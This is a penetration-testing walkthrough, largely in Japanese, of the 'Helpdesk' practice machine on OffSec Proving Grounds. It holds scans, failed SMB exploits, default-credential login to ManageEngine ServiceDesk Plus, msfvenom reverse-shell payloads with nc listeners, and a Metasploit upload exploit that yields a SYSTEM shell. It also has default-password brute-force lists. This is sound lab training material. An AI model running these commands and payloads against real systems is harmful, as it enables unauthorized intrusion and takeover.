# Helpdesk

| Variable          | Value        |
| ----------------- | ------------ |
| Remote IP         | 192.168.223.43  |
| Local IP          | 192.168.49.223   |
| Local listen port | 80 |

## Port scan

### RustScan

- [x] Full TCP port scan

```bash
‚îå‚îÄ‚îÄ(l3ickeyüëΩkali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Helpdesk]
‚îî‚îÄ$ rustscan -a 192.168.223.43 --ulimit 5000 --timeout 2000 -- -sV -A -Pn -oN nmap_results.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/funa/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.223.43:135
Open 192.168.223.43:139
Open 192.168.223.43:445
Open 192.168.223.43:3389
Open 192.168.223.43:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

<snip>

PORT     STATE SERVICE       REASON  VERSION
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  syn-ack Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Service
8080/tcp open  http          syn-ack Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: ManageEngine ServiceDesk Plus
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags:
|   /:
|     JSESSIONID:
|_      httponly flag not set
Service Info: Host: HELPDESK; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
| smb-os-discovery:
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: HELPDESK
|   NetBIOS computer name: HELPDESK\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-06-06T04:42:03-07:00
|_clock-skew: mean: 2h20m00s, deviation: 4h02m29s, median: 0s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 34707/tcp): CLEAN (Timeout)
|   Check 2 (port 43553/tcp): CLEAN (Timeout)
|   Check 3 (port 30102/udp): CLEAN (Timeout)
|   Check 4 (port 29437/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: HELPDESK, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ba:7c:3b (VMware)
| Names:
|   HELPDESK<00>         Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   HELPDESK<20>         Flags: <unique><active>
| Statistics:
|   00 50 56 ba 7c 3b 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb2-security-mode:
|   2.0.2:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2022-06-06T11:42:03
|_  start_date: 2022-06-06T10:57:32

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:42
Completed NSE at 20:42, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:42
Completed NSE at 20:42, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:42
Completed NSE at 20:42, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.01 seconds

```

### Nmap

- [x] Well-known UDP port scan

```bash
‚îå‚îÄ‚îÄ(l3ickeyüëΩkali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Helpdesk]
‚îî‚îÄ$ sudo nmap -Pn -sU --min-rate=10000 192.168.223.43
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-06 19:59 JST
Nmap scan report for 192.168.223.43
Host is up (0.25s latency).
Not shown: 999 open|filtered udp ports (no-response)
PORT    STATE SERVICE
137/udp open  netbios-ns

Nmap done: 1 IP address (1 host up) scanned in 2.46 seconds

```

## TCP

### msrpc - 135

| software name         | version | vulnerability |
| --------------------- | ------- | ------------- |
| Microsoft Windows RPC |         |               |

### netbios-ssn - 139, microsoft-ds - 445

| software name                 | version                                        | vulnerability                                                |
| ----------------------------- | ---------------------------------------------- | ------------------------------------------------------------ |
| Microsoft Windows netbios-ssn |                                                |                                                              |
| Windows Server (R)            | 2008 Standard 6001 Service Pack 1 microsoft-ds | [Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB RCE (MS17-010)](https://www.exploit-db.com/exploits/42315) |

`Windows Server` „ÅÆËÑÜÂº±ÊÄß„ÇíË™ø„Åπ„Çã„Å®Ôºå[Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB RCE (MS17-010)](https://www.exploit-db.com/exploits/42315) „ÅåË¶ã„Å§„Åã„ÇãÔºé

```bash
‚îå‚îÄ‚îÄ(l3ickeyü•∫kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Helpdesk]
‚îî‚îÄ$ python 42315.py
Traceback (most recent call last):
  File "/home/funa/l3ickey/pentest-cheat-sheet/offsec-pg/Helpdesk/42315.py", line 3, in <module>
    from mysmb import MYSMB
ModuleNotFoundError: No module named 'mysmb'

‚îå‚îÄ‚îÄ(l3ickeyü•∫kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Helpdesk]
‚îî‚îÄ$ wget https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py
--2022-06-06 21:59:47--  https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py
raw.githubusercontent.com (raw.githubusercontent.com) „ÇíDNS„Å´Âïè„ÅÑ„ÅÇ„Çè„Åõ„Å¶„ÅÑ„Åæ„Åô... 185.199.108.133, 185.199.111.133, 185.199.109.133, ...
raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443 „Å´Êé•Á∂ö„Åó„Å¶„ÅÑ„Åæ„Åô... Êé•Á∂ö„Åó„Åæ„Åó„Åü„ÄÇ
HTTP „Å´„Çà„ÇãÊé•Á∂öË¶ÅÊ±Ç„ÇíÈÄÅ‰ø°„Åó„Åæ„Åó„Åü„ÄÅÂøúÁ≠î„ÇíÂæÖ„Å£„Å¶„ÅÑ„Åæ„Åô... 200 OK
Èï∑„Åï: 16669 (16K) [text/plain]
`42315.py.1' „Å´‰øùÂ≠ò‰∏≠

42315.py.1                    100%[================================================>]  16.28K  --.-KB/s ÊôÇÈñì 0.002s

2022-06-06 21:59:47 (6.42 MB/s) - `42315.py.1' „Å∏‰øùÂ≠òÂÆå‰∫Ü [16669/16669]


‚îå‚îÄ‚îÄ(l3ickeyü•∫kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Helpdesk]
‚îî‚îÄ$ mv 42315.py.1 mysmb.py

```

Âà∫„Åï„Çâ„Å™„Åã„Å£„ÅüÔºé

```bash
‚îå‚îÄ‚îÄ(l3ickeyü•∫kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Helpdesk]
‚îî‚îÄ$ python 42315.py 192.168.223.43
Target OS: Windows Server (R) 2008 Standard 6001 Service Pack 1
Not found accessible named pipe
Done

```

`metasploit` „Çí‰Ωø„ÅÜÔºé

```bash
msf6 > use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > options

Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   445              yes       The target port (TCP)
   WAIT    180              yes       The number of seconds to wait for the attack to complete.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.0.153    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Vista SP1/SP2 and Server 2008 (x86)


msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set rhosts 192.168.223.43
rhosts => 192.168.223.43
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set lhost tun0
lhost => tun0
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > run

[*] Started reverse TCP handler on 192.168.49.223:4444
[*] 192.168.223.43:445 - Connecting to the target (192.168.223.43:445)...
[*] 192.168.223.43:445 - Sending the exploit packet (951 bytes)...
[*] 192.168.223.43:445 - Waiting up to 180 seconds for exploit to trigger...


```



- [ ] List shared folders

```bash
smbclient -L 192.168.223.43 -p 445 -U Administrator
```

- [ ] Connect a shared folder

```bash
smbclient \\\\192.168.223.43\\sharename -p 445 -U Administrator
```

- [ ] Download all files

```bash
smbclient \\\\192.168.223.43\\sharename -p 445 -U Administrator
smb: \> mask ""  # specifies the mask which is used to filter the files within the directory ("" for all files)
smb: \> recurse  # toggles recursion on (default: off)
smb: \> prompt   # toggles prompting for filenames off (default: on)
smb: \> mget *   # copies all files matching the mask from host to client machine
```

### ms-wbt-server - 3389

| software name              | version | vulnerability |
| -------------------------- | ------- | ------------- |
| Microsoft Terminal Service |         |               |

- [ ] Guest login

  - [ ] `:`

  ```bash
  xfreerdp /v:192.168.223.43
  ```

- [ ] Administrator login

  - [ ] `Administrator:`

  ```bash
  xfreerdp /v:192.168.223.43 /cert:ignore /u:Administrator
  ```

### HTTP - 8080

| software name                   | version | vulnerability                                                |
| ------------------------------- | ------- | ------------------------------------------------------------ |
| Apache Tomcat/Coyote JSP engine | 1.1     |                                                              |
| Apache Tomcat                   | 5.0.28  |                                                              |
| ManageEngine ServiceDesk Plus   | 7.6.0   | [CVE-2014-5301.py](https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py) |

#### Enumeration

- [ ] Directory buster
  - [x] /
  
  `ManageEngine ServiceDesk Plus | 7.6.0` „Å®„ÅÑ„ÅÜ„ÇΩ„Éï„Éà„Ç¶„Çß„Ç¢Âêç„Å®„Éê„Éº„Ç∏„Éß„É≥„ÅåÊõ∏„Åã„Çå„Å¶„ÅÑ„ÇãÔºé
  
  ![image-20220606210419503](/home/funa/.config/Typora/typora-user-images/image-20220606210419503.png)
  
  `ManageEngine ServiceDesk Plus` „ÅÆ„Éá„Éï„Ç©„É´„ÉàË™çË®ºÊÉÖÂ†±„ÅØ `administrator:administrator` „Å™„ÅÆ„ÅßË©¶„ÅôÔºé
  
  „ÉÄ„ÉÉ„Ç∑„É•„Éú„Éº„Éâ„Å´„É≠„Ç∞„Ç§„É≥„Åô„Çã„Åì„Å®„Åå„Åß„Åç„ÅüÔºé
  
  ![image-20220606212443296](/home/funa/.config/Typora/typora-user-images/image-20220606212443296.png)
  
  `ManageEngine ServiceDesk Plus` „ÅÆËÑÜÂº±ÊÄß„ÇíË™ø„Åπ„Çã„Å®Ôºå„Éá„Ç£„É¨„ÇØ„Éà„É™„Éà„É©„Éê„Éº„Çµ„É´„ÅÆËÑÜÂº±ÊÄß„Åå„ÅÇ„Çã„Åì„Å®„Åå„Çè„Åã„ÇãÔºé
  
  [CVE-2014-5301.py](https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py) „Å´„Ç®„ÇØ„Çπ„Éó„É≠„Ç§„Éà„Ç≥„Éº„Éâ„Åå„ÅÇ„Çã„ÅÆ„ÅßË©¶„Åó„Å¶„Åø„ÇãÔºé
  
  „Åæ„Åö„ÅØ `msfvenom` „Çí‰Ωø„Å£„Å¶„Éö„Ç§„É≠„Éº„Éâ„Çí‰ΩúÊàê„Åô„ÇãÔºé
  
  ```bash
  ‚îå‚îÄ‚îÄ(l3ickeyüëΩkali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Helpdesk]
  ‚îî‚îÄ$ msfvenom -p java/shell_reverse_tcp LHOST=192.168.49.223 LPORT=445 -f war > shell.war
  Payload size: 13322 bytes
  Final size of war file: 13322 bytes
  
  ```
  
  `nc` „Åß„É™„Éê„Éº„Çπ„Ç∑„Çß„É´„ÇíÂæÖ„Å°Âèó„Åë„ÇãÔºé
  
  ```bash
  ‚îå‚îÄ‚îÄ(l3ickeyüëΩkali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Helpdesk]
  ‚îî‚îÄ$ nc -lnvp 445
  listening on [any] 445 ...
  
  ```
  
  „Ç®„ÇØ„Çπ„Éó„É≠„Ç§„Éà„ÇíÂÆüË°å„Åô„ÇãÔºé
  
  ```bash
  ‚îå‚îÄ‚îÄ(l3ickeyüéÉkali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Helpdesk]
  ‚îî‚îÄ$ python3 CVE-2014-5301.py 192.168.223.43 8080 administrator administrator shell.war
  Trying http://192.168.223.43:8080/0R4x8VWFcV0keiu3UtkzYTDJmYAIpliR/pkiyzixva/y7412PzqYqW8I33n
  Trying http://192.168.223.43:8080/0R4x8VWFcV0keiu3UtkzYTDJmYAIpliR/pkiyzixva/1mBDYb2g7E5LtYo8
  Trying http://192.168.223.43:8080/0R4x8VWFcV0keiu3UtkzYTDJmYAIpliR/pkiyzixva/yOCUbYdCmJ1FxgfN
  
  ```
  
  „É™„Éê„Éº„Çπ„Ç∑„Çß„É´„ÇíÂèó„ÅëÂèñ„Çã„Åì„Å®„Åå„Åß„Åç„ÇãÔºé„Åó„Åã„ÅóÔºå„Ç≥„Éû„É≥„Éâ„Å´ÂØæ„Åó„Å¶ÂøúÁ≠î„Åó„Å™„ÅÑÔºé
  
  ```bash
  ‚îå‚îÄ‚îÄ(l3ickeyüëΩkali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Helpdesk]
  ‚îî‚îÄ$ nc -lnvp 445
  listening on [any] 445 ...
  connect to [192.168.49.223] from (UNKNOWN) [192.168.223.43] 49204
  ls
  id
  java.lang.OutOfMemoryError: Java heap space                                                                           
  ```
  
  `meterpreter` „ÅÆ„Éö„Ç§„É≠„Éº„Éâ„ÇÇË©¶„Åó„Å¶„Åø„Åü„ÅåÔºå„Ç∑„Çß„É´„ÅåËøî„Å£„Å¶„Åì„Å™„ÅÑÔºé
  
  ```bash
  ‚îå‚îÄ‚îÄ(l3ickeyüëΩkali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Helpdesk]
  ‚îî‚îÄ$ msfvenom -p java/shell_reverse_tcp LHOST=192.168.49.223 LPORT=4444 -f war > shell.war
  Payload size: 13322 bytes
  Final size of war file: 13322 bytes
  
  ‚îå‚îÄ‚îÄ(l3ickeyüëΩkali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Helpdesk]
  ‚îî‚îÄ$ msfconsole
  msf6 > use multi/handler
  [*] Using configured payload generic/shell_reverse_tcp
  msf6 exploit(multi/handler) > set payload java/meterpreter/reverse_tcp
  payload => java/meterpreter/reverse_tcp
  msf6 exploit(multi/handler) > set LHOST 192.168.49.223
  LHOST => 192.168.49.223
  msf6 exploit(multi/handler) > run
  
  [*] Started reverse TCP handler on 192.168.49.223:4444
  
  ```
  
  ```bash
  ‚îå‚îÄ‚îÄ(l3ickeyüéÉkali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Helpdesk]
  ‚îî‚îÄ$ python3 CVE-2014-5301.py 192.168.223.43 8080 administrator administrator shell.war
  Trying http://192.168.223.43:8080/F3rZC8pJ9bPV11LggtrNA8NFozFvDURL/eopzqkowmj/UqF408QOM04cbKBA
  Trying http://192.168.223.43:8080/F3rZC8pJ9bPV11LggtrNA8NFozFvDURL/eopzqkowmj/acHCnMEWBvCb7mFJ
  Trying http://192.168.223.43:8080/F3rZC8pJ9bPV11LggtrNA8NFozFvDURL/eopzqkowmj/PGXLI45QRQZaGSUK
  
  ```
  
  `metasploit` „Çí‰Ωø„ÅÜÔºé
  
  ```bash
  ‚îå‚îÄ‚îÄ(l3ickeyüëΩkali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Helpdesk]
  ‚îî‚îÄ$ msfconsole
  
                 .;lxO0KXXXK0Oxl:.
             ,o0WMMMMMMMMMMMMMMMMMMKd,
          'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
        :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
      .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
     lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
    xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
   oMMMMMMMMMMx.                    dMMMMMMMMMMx
  .WMMMMMMMMM:                       :MMMMMMMMMM,
  xMMMMMMMMMo                         lMMMMMMMMMO
  NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
  MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
  NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
  xMMMMMMMMMd                        ,0MMMMMMMMMMK;
  .WMMMMMMMMMc                         'OMMMMMM0,
   lMMMMMMMMMMk.                         .kMMO'
    dMMMMMMMMMMWd'                         ..
     cWMMMMMMMMMMMNxc'.                ##########
      .0MMMMMMMMMMMMMMMMWc            #+#    #+#
        ;0MMMMMMMMMMMMMMMo.          +:+
          .dNMMMMMMMMMMMMo          +#++:++#+
             'oOWMMMMMMMMo                +:+
                 .,cdkO0K;        :+:    :+:
                                  :::::::+:
                        Metasploit
  
         =[ metasploit v6.1.38-dev                          ]
  + -- --=[ 2212 exploits - 1171 auxiliary - 396 post       ]
  + -- --=[ 615 payloads - 45 encoders - 11 nops            ]
  + -- --=[ 9 evasion                                       ]
  
  Metasploit tip: View all productivity tips with the
  tips command
  
  msf6 > search manageengine
  
  Matching Modules
  ================
  
     #   Name                                                                 Disclosure Date  Rank       Check  Description
     -   ----                                                                 ---------------  ----       -----  -----------
     0   exploit/windows/http/manageengine_adshacluster_rce                   2018-06-28       excellent  Yes    Manage Engine Exchange Reporter Plus Unauthenticated RCE
     1   exploit/windows/http/manageengine_adselfservice_plus_cve_2021_40539  2021-09-07       excellent  Yes    ManageEngine ADSelfService Plus CVE-2021-40539
     2   exploit/windows/http/manageengine_apps_mngr                          2011-04-08       average    No     ManageEngine Applications Manager Authenticated Code Execution
     3   exploit/windows/http/manageengine_appmanager_exec                    2018-03-07       excellent  Yes    ManageEngine Applications Manager Remote Code Execution
     4   exploit/multi/http/manage_engine_dc_pmp_sqli                         2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
     5   exploit/windows/http/manageengine_connectionid_write                 2015-12-14       excellent  Yes    ManageEngine Desktop Central 9 FileUploadServlet ConnectionId Vulnerability
     6   auxiliary/admin/http/manage_engine_dc_create_admin                   2014-12-31       normal     No     ManageEngine Desktop Central Administrator Account Creation
     7   exploit/windows/http/desktopcentral_file_upload                      2013-11-11       excellent  Yes    ManageEngine Desktop Central AgentLogUpload Arbitrary File Upload
     8   exploit/windows/http/desktopcentral_deserialization                  2020-03-05       excellent  Yes    ManageEngine Desktop Central Java Deserialization
     9   auxiliary/scanner/http/manageengine_desktop_central_login                             normal     No     ManageEngine Desktop Central Login Utility
     10  exploit/windows/http/desktopcentral_statusupdate_upload              2014-08-31       excellent  Yes    ManageEngine Desktop Central StatusUpdate Arbitrary File Upload
     11  auxiliary/scanner/http/manageengine_deviceexpert_traversal           2012-03-18       normal     No     ManageEngine DeviceExpert 5.6 ScheduleResultViewer FileName Traversal
     12  auxiliary/scanner/http/manageengine_deviceexpert_user_creds          2014-08-28       normal     No     ManageEngine DeviceExpert User Credentials
     13  exploit/windows/misc/manageengine_eventlog_analyzer_rce              2015-07-11       manual     Yes    ManageEngine EventLog Analyzer Remote Code Execution
     14  exploit/multi/http/eventlog_file_upload                              2014-08-31       excellent  Yes    ManageEngine Eventlog Analyzer Arbitrary File Upload
     15  auxiliary/gather/eventlog_cred_disclosure                            2014-11-05       normal     No     ManageEngine Eventlog Analyzer Managed Hosts Administrator Credential Disclosure
     16  auxiliary/admin/http/manageengine_dir_listing                        2015-01-28       normal     No     ManageEngine Multiple Products Arbitrary Directory Listing
     17  auxiliary/admin/http/manageengine_file_download                      2015-01-28       normal     No     ManageEngine Multiple Products Arbitrary File Download
     18  exploit/multi/http/manageengine_auth_upload                          2014-12-15       excellent  Yes    ManageEngine Multiple Products Authenticated File Upload
     19  auxiliary/admin/http/netflow_file_download                           2014-11-30       normal     No     ManageEngine NetFlow Analyzer Arbitrary File Download
     20  exploit/windows/http/manage_engine_opmanager_rce                     2015-09-14       manual     Yes    ManageEngine OpManager Remote Code Execution
     21  exploit/multi/http/opmanager_sumpdu_deserialization                  2021-07-26       excellent  Yes    ManageEngine OpManager SumPDU Java Deserialization
     22  exploit/multi/http/opmanager_socialit_file_upload                    2014-09-27       excellent  Yes    ManageEngine OpManager and Social IT Arbitrary File Upload
     23  auxiliary/admin/http/manageengine_pmp_privesc                        2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
     24  exploit/multi/http/manageengine_search_sqli                          2012-10-18       excellent  Yes    ManageEngine Security Manager Plus 5.5 Build 5505 SQL Injection
     25  auxiliary/scanner/http/manageengine_securitymanager_traversal        2012-10-19       normal     No     ManageEngine SecurityManager Plus 5.5 Directory Traversal
     26  exploit/multi/http/manageengine_sd_uploader                          2015-08-20       excellent  Yes    ManageEngine ServiceDesk Plus Arbitrary File Upload
     27  exploit/windows/http/manageengine_servicedesk_plus_cve_2021_44077    2021-09-16       excellent  Yes    ManageEngine ServiceDesk Plus CVE-2021-44077
     28  auxiliary/scanner/http/servicedesk_plus_traversal                    2015-10-03       normal     No     ManageEngine ServiceDesk Plus Path Traversal
     29  auxiliary/scanner/http/support_center_plus_directory_traversal       2014-01-28       normal     No     ManageEngine Support Center Plus Directory Traversal
  
  
  Interact with a module by name or index. For example info 29, use 29 or use auxiliary/scanner/http/support_center_plus_directory_traversal
  
  msf6 > use 18
  [*] No payload configured, defaulting to java/meterpreter/reverse_tcp
  msf6 exploit(multi/http/manageengine_auth_upload) > options
  
  Module options (exploit/multi/http/manageengine_auth_upload):
  
     Name            Current Setting  Required  Description
     ----            ---------------  --------  -----------
     DOMAIN_NAME                      no        Name of the domain to logon to
     IAMAGENTTICKET                   no        Pre-authenticated IAMAGENTTICKET cookie (IT360 target only)
     JSESSIONID                       no        Pre-authenticated JSESSIONID cookie (non-IT360 targets)
     PASSWORD        guest            yes       Password for the specified username
     Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
     RHOSTS                           yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                /wiki/Using-Metasploit
     RPORT           8080             yes       The target port (TCP)
     SSL             false            no        Negotiate SSL/TLS for outgoing connections
     USERNAME        guest            yes       The username to login as
     VHOST                            no        HTTP server virtual host
  
  
  Payload options (java/meterpreter/reverse_tcp):
  
     Name   Current Setting  Required  Description
     ----   ---------------  --------  -----------
     LHOST  192.168.0.153    yes       The listen address (an interface may be specified)
     LPORT  4444             yes       The listen port
  
  
  Exploit target:
  
     Id  Name
     --  ----
     0   Automatic
  
  
  msf6 exploit(multi/http/manageengine_auth_upload) > set rhosts 192.168.223.43
  rhosts => 192.168.223.43
  msf6 exploit(multi/http/manageengine_auth_upload) > set username administrator
  username => administrator
  msf6 exploit(multi/http/manageengine_auth_upload) > set password administrator
  password => administrator
  msf6 exploit(multi/http/manageengine_auth_upload) > set lhost tun0
  lhost => tun0
  msf6 exploit(multi/http/manageengine_auth_upload) > run
  
  [-] Handler failed to bind to 192.168.49.223:4444:-  -
  [-] Handler failed to bind to 0.0.0.0:4444:-  -
  [-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
  [*] Exploit completed, but no session was created.
  msf6 exploit(multi/http/manageengine_auth_upload) > set lport 1234
  lport => 1234
  msf6 exploit(multi/http/manageengine_auth_upload) > run
  
  [*] Started reverse TCP handler on 192.168.49.223:1234
  [*] Selecting target...
  [*] Selected target ServiceDesk Plus/Plus MSP v7.1 >= b7016 - v9.0 < b9031/AssetExplorer v5-v6.1
  [*] Uploading bogus file...
  [*] Uploading EAR file...
  [+] Upload appears to have been successful
  [*] Attempting to launch payload in deployed WAR...
  [*] Sending stage (58829 bytes) to 192.168.223.43
  [*] Meterpreter session 1 opened (192.168.49.223:1234 -> 192.168.223.43:49180 ) at 2022-06-07 00:16:55 +0900
  
  meterpreter > shell
  Process 1 created.
  Channel 1 created.
  Microsoft Windows [Version 6.0.6001]
  Copyright (c) 2006 Microsoft Corporation.  All rights reserved.
  
  C:\ManageEngine\ServiceDesk\bin>whoami
  whoami
  nt authority\system
  
  C:\ManageEngine\ServiceDesk\bin>cd /
  cd /
  
  C:\>dir
  dir
   Volume in drive C has no label.
   Volume Serial Number is BCAD-595B
  
   Directory of C:\
  
  09/18/2006  02:43 PM                24 autoexec.bat
  09/18/2006  02:43 PM                10 config.sys
  12/20/2009  04:06 AM    <DIR>          ManageEngine
  01/19/2008  02:40 AM    <DIR>          PerfLogs
  12/27/2012  12:53 AM    <DIR>          Program Files
  12/19/2009  12:35 PM    <DIR>          Users
  03/19/2020  05:48 PM    <DIR>          Windows
                 2 File(s)             34 bytes
                 5 Dir(s)   6,297,026,560 bytes free
  
  C:\>cd Users/Administrator/Desktop
  cd Users/Administrator/Desktop
  
  C:\Users\Administrator\Desktop>dir
  dir
   Volume in drive C has no label.
   Volume Serial Number is BCAD-595B
  
   Directory of C:\Users\Administrator\Desktop
  
  01/18/2016  09:32 AM    <DIR>          .
  01/18/2016  09:32 AM    <DIR>          ..
  12/20/2009  06:03 AM    <DIR>          ITSHARED
  12/20/2009  05:05 AM             1,535 ManageEngine ServiceDesk.lnk
  06/06/2022  08:11 AM                34 proof.txt
                 2 File(s)          1,569 bytes
                 3 Dir(s)   6,297,026,560 bytes free
  
  C:\Users\Administrator\Desktop>type proof.txt
  type proof.txt
  da9b13146c6ef454df27d66c110f36ce
  
  
  ```
  
  
  
  
  
  - [ ] /debug/
  - [ ] /jsp/
  - [ ] /mc/
  - [ ] /servlet/
  - [ ] /tasks/


```bash
‚îå‚îÄ‚îÄ(l3ickeyüëΩkali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Helpdesk]
‚îî‚îÄ$ gobuster dir -f -u http://192.168.223.43:8080/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.223.43:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2022/06/06 21:02:53 Starting gobuster in directory enumeration mode
===============================================================
/debug/               (Status: 200) [Size: 9776]
/jsp/                 (Status: 200) [Size: 9776]
/mc/                  (Status: 200) [Size: 1806]
/servlet/             (Status: 200) [Size: 9776]
/tasks/               (Status: 200) [Size: 9776]

===============================================================
2022/06/06 21:04:54 Finished
===============================================================

```

```bash
‚îå‚îÄ‚îÄ(l3ickeyü•∫kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Helpdesk]
‚îî‚îÄ$ gobuster dir -f -u http://192.168.223.43:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.223.43:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2022/06/06 21:03:25 Starting gobuster in directory enumeration mode
===============================================================
/servlet/             (Status: 200) [Size: 9776]
/jsp/                 (Status: 200) [Size: 9776]
/mc/                  (Status: 200) [Size: 1806]
/debug/               (Status: 200) [Size: 9776]
/tasks/               (Status: 200) [Size: 9776]

===============================================================
2022/06/06 21:41:09 Finished
===============================================================

```

| wordlist path                                               | description                        | lines  |
| ----------------------------------------------------------- | ---------------------------------- | ------ |
| /usr/share/wordlists/dirb/common.txt                        | default wordlist for dirb          | 4,614  |
| /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt | priority order case sensitive list | 87,664 |

- [ ] Read the page source
- [ ] Check the cookie

#### Login brute force

- [ ] Default credentials
  - [ ] admin:admin
  - [ ] admin:password
  - [ ] administrator:administrator
  - [ ] administrator:password
  - [ ] root:root
  - [ ] root:password

- [ ] [Most common passwords](https://cybernews.com/best-password-managers/most-common-passwords/)
  - [ ] 123456
  - [ ] 123456789
  - [ ] qwerty

- [ ] Basic Authentication

